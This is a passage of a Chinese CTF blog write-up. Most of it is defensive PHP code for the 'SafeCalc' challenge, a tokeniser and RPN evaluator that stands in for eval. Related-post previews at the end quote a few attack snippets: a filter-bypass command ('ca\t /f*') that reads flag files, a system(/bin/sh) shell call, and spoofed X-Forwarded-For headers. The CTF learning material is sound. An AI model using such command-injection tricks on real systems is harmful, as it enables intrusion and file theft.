class="string">&#x27;bad number&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$num</span> = (<span class="keyword">float</span>)<span class="variable">$numStr</span>;</span><br><span class="line">            <span class="variable">$tokens</span>[] = <span class="variable">$num</span>;</span><br><span class="line">            <span class="variable">$prevType</span> = <span class="string">&#x27;num&#x27;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Operators / parentheses</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">str_contains</span>(<span class="string">&#x27;+-*/%()&#x27;</span>, <span class="variable">$ch</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$ch</span> === <span class="string">&#x27;+&#x27;</span> || <span class="variable">$ch</span> === <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// Unary if at start or after operator or after &#x27;(&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$prevType</span> === <span class="string">&#x27;start&#x27;</span> || <span class="variable">$prevType</span> === <span class="string">&#x27;op&#x27;</span> || <span class="variable">$prevType</span> === <span class="string">&#x27;lparen&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$tokens</span>[] = (<span class="variable">$ch</span> === <span class="string">&#x27;+&#x27;</span>) ? <span class="string">&#x27;u+&#x27;</span> : <span class="string">&#x27;u-&#x27;</span>;</span><br><span class="line">                    <span class="variable">$prevType</span> = <span class="string">&#x27;op&#x27;</span>;</span><br><span class="line">                    <span class="variable">$i</span>++;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$tokens</span>[] = <span class="variable">$ch</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$ch</span> === <span class="string">&#x27;(&#x27;</span>) <span class="variable">$prevType</span> = <span class="string">&#x27;lparen&#x27;</span>;</span><br><span class="line">            <span class="keyword">elseif</span> (<span class="variable">$ch</span> === <span class="string">&#x27;)&#x27;</span>) <span class="variable">$prevType</span> = <span class="string">&#x27;rparen&#x27;</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="variable">$prevType</span> = <span class="string">&#x27;op&#x27;</span>;</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;invalid token&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Basic sanity: expression shouldn&#x27;t end with a binary operator</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$prevType</span> === <span class="string">&#x27;op&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// allow ending with unary? (shouldn&#x27;t happen)</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;incomplete expression&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token limit (DoS guard)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$tokens</span>) &gt; <span class="number">200</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;too complex&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tokens</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Convert tokens to Reverse Polish Notation (Shunting-yard). */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">to_rpn</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$tokens</span></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">    <span class="variable">$out</span> = [];</span><br><span class="line">    <span class="variable">$ops</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$prec</span> = [</span><br><span class="line">        <span class="string">&#x27;u+&#x27;</span> =&gt; <span class="number">3</span>, <span class="string">&#x27;u-&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">        <span class="string">&#x27;*&#x27;</span>  =&gt; <span class="number">2</span>, <span class="string">&#x27;/&#x27;</span>  =&gt; <span class="number">2</span>, <span class="string">&#x27;%&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">        <span class="string">&#x27;+&#x27;</span>  =&gt; <span class="number">1</span>, <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="number">1</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$rightAssoc</span> = [<span class="string">&#x27;u+&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;u-&#x27;</span> =&gt; <span class="literal">true</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$tokens</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_float</span>(<span class="variable">$t</span>) || <span class="title function_ invoke__">is_int</span>(<span class="variable">$t</span>)) &#123;</span><br><span class="line">            <span class="variable">$out</span>[] = (<span class="keyword">float</span>)<span class="variable">$t</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$t</span> === <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$ops</span>[] = <span class="variable">$t</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$t</span> === <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!<span class="keyword">empty</span>(<span class="variable">$ops</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$ops</span>) !== <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$out</span>[] = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$ops</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$ops</span>)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;mismatched parentheses&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_pop</span>(<span class="variable">$ops</span>); <span class="comment">// pop &#x27;(&#x27;</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// operator</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$prec</span>[<span class="variable">$t</span>])) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;unknown operator&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!<span class="keyword">empty</span>(<span class="variable">$ops</span>)) &#123;</span><br><span class="line">            <span class="variable">$top</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$ops</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$top</span> === <span class="string">&#x27;(&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$prec</span>[<span class="variable">$top</span>])) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$p1</span> = <span class="variable">$prec</span>[<span class="variable">$t</span>];</span><br><span class="line">            <span class="variable">$p2</span> = <span class="variable">$prec</span>[<span class="variable">$top</span>];</span><br><span class="line">            <span class="variable">$isRight</span> = <span class="keyword">isset</span>(<span class="variable">$rightAssoc</span>[<span class="variable">$t</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((!<span class="variable">$isRight</span> &amp;&amp; <span class="variable">$p1</span> &lt;= <span class="variable">$p2</span>) || (<span class="variable">$isRight</span> &amp;&amp; <span class="variable">$p1</span> &lt; <span class="variable">$p2</span>)) &#123;</span><br><span class="line">                <span class="variable">$out</span>[] = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$ops</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ops</span>[] = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!<span class="keyword">empty</span>(<span class="variable">$ops</span>)) &#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$ops</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$op</span> === <span class="string">&#x27;(&#x27;</span> || <span class="variable">$op</span> === <span class="string">&#x27;)&#x27;</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;mismatched parentheses&#x27;</span>);</span><br><span class="line">        <span class="variable">$out</span>[] = <span class="variable">$op</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Evaluate RPN stack safely. */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">eval_rpn</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$rpn</span></span>): <span class="title">float</span> </span>&#123;</span><br><span class="line">    <span class="variable">$st</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$rpn</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_float</span>(<span class="variable">$t</span>) || <span class="title function_ invoke__">is_int</span>(<span class="variable">$t</span>)) &#123;</span><br><span class="line">            <span class="variable">$st</span>[] = (<span class="keyword">float</span>)<span class="variable">$t</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$t</span> === <span class="string">&#x27;u+&#x27;</span> || <span class="variable">$t</span> === <span class="string">&#x27;u-&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$st</span>) &lt; <span class="number">1</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bad expression&#x27;</span>);</span><br><span class="line">            <span class="variable">$a</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$st</span>);</span><br><span class="line">            <span class="variable">$st</span>[] = (<span class="variable">$t</span> === <span class="string">&#x27;u-&#x27;</span>) ? -<span class="variable">$a</span> : <span class="variable">$a</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$st</span>) &lt; <span class="number">2</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bad expression&#x27;</span>);</span><br><span class="line">        <span class="variable">$b</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$st</span>);</span><br><span class="line">        <span class="variable">$a</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$st</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$t</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="variable">$v</span> = <span class="variable">$a</span> + <span class="variable">$b</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="variable">$v</span> = <span class="variable">$a</span> - <span class="variable">$b</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="variable">$v</span> = <span class="variable">$a</span> * <span class="variable">$b</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">abs</span>(<span class="variable">$b</span>) &lt; <span class="number">1e-15</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;division by zero&#x27;</span>);</span><br><span class="line">                <span class="variable">$v</span> = <span class="variable">$a</span> / <span class="variable">$b</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">abs</span>(<span class="variable">$b</span>) &lt; <span class="number">1e-15</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;division by zero&#x27;</span>);</span><br><span class="line">                <span class="variable">$v</span> = <span class="title function_ invoke__">fmod</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;unknown operator&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_finite</span>(<span class="variable">$v</span>)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;overflow&#x27;</span>);</span><br><span class="line">        <span class="variable">$st</span>[] = <span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$st</span>) !== <span class="number">1</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bad expression&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">float</span>)<span class="variable">$st</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>话说这种其实可以存脚本【取代eval函数接受post参数】</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://luoyinhui.github.io">luoyinhui</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://luoyinhui.github.io/posts/6e242bce/">https://luoyinhui.github.io/posts/6e242bce/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://luoyinhui.github.io" target="_blank">落殷回的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/2026/">2026</a><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a></div><div class="post-share"><div class="social-share" data-image="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-8.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/pluginsSrc/butterfly-extsrc/sharejs/dist/css/share.min.css?v=1.1.6" media="print" onload="this.media='all'"><script src="/pluginsSrc/butterfly-extsrc/sharejs/dist/js/social-share.min.js?v=1.1.6" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/weixin.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/weixin.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/zhifubao.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zhifubao.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/2f862a25/" title="【笔记】零（被）碎（拷）问（打）题记录"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="onerror=null;src='/img/404.webp'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">【笔记】零（被）碎（拷）问（打）题记录</div></div><div class="info-2"><div class="info-item-1">¶网络 ¶掩码考点  同一局域网下的192.168.50.128/25和192.168.50.127/25能否ping通（无路由器无交换机的情况） 那同一局域网下的192.168.50.127/25和192.168.50.126/25能否ping通  子网掩码（Subnet Mask）是计算机网络中非常核心的概念。简单来说，它的作用就是在 IP 地址中“划线”，区分哪一部分代表“街道”（网络号），哪一部分代表“门牌号”（主机号）。 以下是关于子网掩码的核心知识点：  核心作用：身份识别 一个 IP 地址（如 192.168.1.5）本身无法告诉电脑它属于哪个网络。子网掩码的作用就是：   确定网络地址： 告诉设备哪些位是网络标识。 确定主机地址： 告诉设备哪些位是个体设备标识。 判断是否在同一网段： 电脑通过子网掩码计算出目标 IP 是否和自己在同一个“群聊”里。如果是，直接发消息；如果不是，就发给路由器（网关）。  ¶2. 形态与结构 子网掩码和 IP 地址一样，也是 32 位二进制数，通常用“点分十进制”表示。它的规则非常简单粗暴：  连续的 1： 对应的 IP 位是网络号。...</div></div></div></a><a class="pagination-related" href="/posts/eb9d2e41/" title="阶段小结"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="onerror=null;src='/img/404.webp'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">阶段小结</div></div><div class="info-2"><div class="info-item-1">乱七八糟没有逻辑的反思，要是不小心折磨了你的眼睛非常抱歉ㅍ_ㅍ</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/90f90e31/" title="【比赛】2026-furryCTF"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%912026-furryCTF_image.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-13</div><div class="info-item-2">【比赛】2026-furryCTF</div></div><div class="info-2"><div class="info-item-1">持续更新中...</div></div></div></a><a class="pagination-related" href="/posts/659617ad/" title="【比赛】青少年CTF-S1·2026公益赛"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-21.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-05</div><div class="info-item-2">【比赛】青少年CTF-S1·2026公益赛</div></div><div class="info-2"><div class="info-item-1">菜鸟一个，很多都是ai解完再回头复盘的，力扣原题更是纯ai，存档咯如果伤害了你的眼睛抱歉</div></div></div></a><a class="pagination-related" href="/posts/3a95b3f6/" title="【刷题】ctfshow-web合集wp"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-20</div><div class="info-item-2">【刷题】ctfshow-web合集wp</div></div><div class="info-2"><div class="info-item-1">¶web入门 ¶信息搜集 ¶web1  使用浏览器自带的审计功能F12可以查看网站源代码. 前端的HTML（超文本标记语言）中，如果想要添加注释，需要使用 注释标签。该标签用来在源文档中插入注释，注释不会在浏览器中显示。 在URL前可以通过添加 view-source:URL 实现绕过前端限制显示网页源码.  ¶web2  JavaScript实现禁用代码审计   js前台拦截完全就是无效操作 因为js前台拦截可以有三种方法获取  禁用js：  直接ctrl+u 抓包 直接在url前边加view-source:   ¶web3  自带工具直接抓包   ¶web4  提示了robot题型    ¶web5  phps源码泄露 PHPS 文件是 PHP 源代码文件，通常用于通过 Web 浏览器直接查看 PHP 代码内容。然而，这种文件可能导致源码泄露，带来安全隐患。 法一：使用工具：dirsearch  http状态码       法二： php语言编写网站的主页文件是index.php   ¶web6  题目  解压源码到当前目录，测试正常，收工 考察代码泄露。直接访问url/ww...</div></div></div></a><a class="pagination-related" href="/posts/9004eb76/" title="【刷题】SPC新生讲座题目wp"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-06</div><div class="info-item-2">【刷题】SPC新生讲座题目wp</div></div><div class="info-2"><div class="info-item-1">¶鸣谢  感谢sq,xc学长和cty学姐的帮助和教导！！！ 除了大头像放后面做其他也是完结了，第一次wp磕磕绊绊做出来了嘻嘻  ¶曼波曼波曼波  倒转的base，翻转脚本：  # 读取 txt 文件并翻转内容def reverse_txt_file(input_path, output_path):    try:        with open(input_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:            content = file.read()                reversed_content = content[::-1]                with open(output_path, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file:            file.write(reversed_content)                print(f&quot;成功！原文件: &#123;inpu...</div></div></div></a><a class="pagination-related" href="/posts/d6c104b4/" title="【刷题】ctfshow-pwn合集wp"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-15</div><div class="info-item-2">【刷题】ctfshow-pwn合集wp</div></div><div class="info-2"><div class="info-item-1">¶致谢  感谢sq学长、My6n、Ambb1、Claire_cat的笔记 感谢sq学长的帮助  ¶pwn入门 ¶Test_your_nc ¶pwn0【待】   通过打开容器后获得命令，在finalshell通过手动输入信息成功ssh连上 注意：虚拟机开启NAT模式才能连上，更改模式后重启才生效  pwd指令查看当前目录 ls发现当前目录下没东西 cd /回到上一级目录 ls发现当前目录下有文件ctfshow_flag cat ctfshow_flag得到 flag  ¶pwn1  chmod 777 pwn给附件加权限 checksec pwn查看附件信息，64 位  wp要ida看但其实试运行一遍还有题目都提示nc链接，容器给的命令直接复制黏贴就好了   ¶pwn2  加权限-查信息-运行-nc连接-shell输入代码 system(bin/sh)就是给shell？？  ¶pwn4   反编译程序理解-shell获得  ¶前置基础 ¶pwn5  题目：  运行此文件，将得到的字符串以ctfshow{xxxxx}提交。 如：运行文件后 输出的内容为 Hello_World 提交的...</div></div></div></a><a class="pagination-related" href="/posts/3ea4ec10/" title="【比赛】2024-ISCTF"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-27</div><div class="info-item-2">【比赛】2024-ISCTF</div></div><div class="info-2"><div class="info-item-1">¶File_Format     改回exe输密码解压  ¶starry sky【待】  随波逐流爆图片 尾部XORKEY:FF    010居然还有这功能！！？    记得选无符号字节十六进制   ¶web ¶1z_php  ca\t /f*或者ls /得到f14g文件名  ¶25时晓山瑞希生日会 User-Agent: Project Sekai			//伪造UA头X-Forwarded-For:127.0.0.1			//伪造本地用户  前面都是考过的点 搜索得知 25时生日会 是在八月二十七举办，伪造日期即可得到 flag  Date: Tue, 27 Aug 2024 12:41:59 GMT ¶reverse ¶Ezre   看字符串追踪    </div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="avatar"/></div><div class="author-info-name">luoyinhui</div><div class="author-info-description">记录踩坑与瞎折腾，由Hexo+Github搭建</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/luoyinhui"><i class="fab fa-github"></i><span>Follow Me</span></a><a class="card-info-btn" href="/subscribe"><i class="fas fa-rss"></i><span>订阅RSS</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">热身签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">HappySong</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Happy2026</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E9%80%82%E9%85%8D%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">更适配的方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">happyEmoji</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">SafePIN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">SafeLock</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">SafePassword</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-Exploit"><span class="toc-text">3. 漏洞利用 (Exploit)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">AWDP攻击题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SafeViewer"><span class="toc-text">SafeViewer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">SafeCar</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">AWDP防御题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SafeCalc"><span class="toc-text">SafeCalc</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/f630573e/" title="【笔记】pwn"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【笔记】pwn"/></a><div class="content"><a class="title" href="/posts/f630573e/" title="【笔记】pwn">【笔记】pwn</a><time datetime="2026-01-13T12:30:54.000Z" title="发表于 2026-01-13 20:30:54">2026-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/90f90e31/" title="【比赛】2026-furryCTF"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%912026-furryCTF_image.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【比赛】2026-furryCTF"/></a><div class="content"><a class="title" href="/posts/90f90e31/" title="【比赛】2026-furryCTF">【比赛】2026-furryCTF</a><time datetime="2026-01-13T03:26:32.000Z" title="发表于 2026-01-13 11:26:32">2026-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c1e92d18/" 